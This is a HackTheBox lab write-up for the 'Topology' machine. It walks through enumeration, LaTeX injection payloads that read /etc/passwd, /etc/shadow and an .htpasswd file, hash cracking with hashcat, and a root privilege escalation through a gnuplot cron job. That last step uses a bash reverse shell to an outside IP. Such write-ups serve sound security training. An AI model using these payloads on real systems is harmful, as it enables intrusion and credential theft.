---
slug: /write-up/htb/machines/easy/topology
pagination_next: null
pagination_prev: null
---

## Enumeration

Port 80 and 22 open

22
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

80
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
```

Browsing the website, found this subdomain: http://latex.topology.htb/equation.php, it contains a form where you input Latex commands and a mechanism behind that generates a `png`.

Let's search for more subdomains with gobuster:

```bash
./gobuster vhost -u 10.10.11.217 -k --domain "topology.htb" --append-domain -w ~/workspace/gal/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
```

Found subdomains:
- dev.topology.htb
- stats.topology.htb

Most likely, the service works by writing the provided equation to a file, then invoke a command to pass from tex to png

In a log file we can see the following:

```
This is pdfTeX, Version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian) (preloaded format=pdflatex 2022.2.15)  12 MAR 2022 08:48
```

We see that we can inject commands in Latex, however there are some prohibitions in place:

Prohibited commands:
- `\input`
- `\include`
- `\verbatiminput`
- `\write\outfile{Hello-world}`
- `\immediate\write18{id > output}`

## Foothold

This payload works but only returns the first line:
```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

There's another option to read files:

```tex
$\lstinputlisting{/etc/passwd}$
```

Here we can see the user `vdaisley`.

Knowing that we have scanned the vhost and found dev and see some `.htaccess` and `.htpasswd`, now we can download them with the previous discovered reading method.

```tex
$\lstinputlisting{"/var/www/dev/.htpasswd"}$
$\lstinputlisting{"/etc/shadow"}$
```

it will download the PNG image with the file contents, the password stored is a MD5 hash, which we can extract using tesseract:

```bash
tesseract exfil/equation.png exfil/equation.txt
```

Then crack the hash using hashcat:
```bash
hashcat hash.txt ~/workspace/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
This will return the password for user `vdaisley`, now you can SSH into the machine and get permanent access.

## Privilege escalation

In /opt we can find the `gnuplot` binary owned by root but with write and execution permissions for the user.

This binary is used to generate the images. We can try to see if it's execute by running ps aux multiple times.

If we don't see any result, it means the process is executed by another user. But don't worry, we can use [pspy](https://github.com/DominicBreuker/pspy) to monitor processes not belonging to our user.

And there we see root is executing the following command

```
2023/06/13 16:33:01 CMD: UID=0     PID=1419   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
```

So basically, gnuplot will execute any `plt` file found in /opt/gnuplot. 

Now what we can do is to create a plt file that will start a reverse shell with the user root.

e.g

```
system "bash -c 'bash -i >& /dev/tcp/10.10.14.151/4444 0>&1'"
```

Once the connection is established, we'll have `root` access in the console and we can read the flag.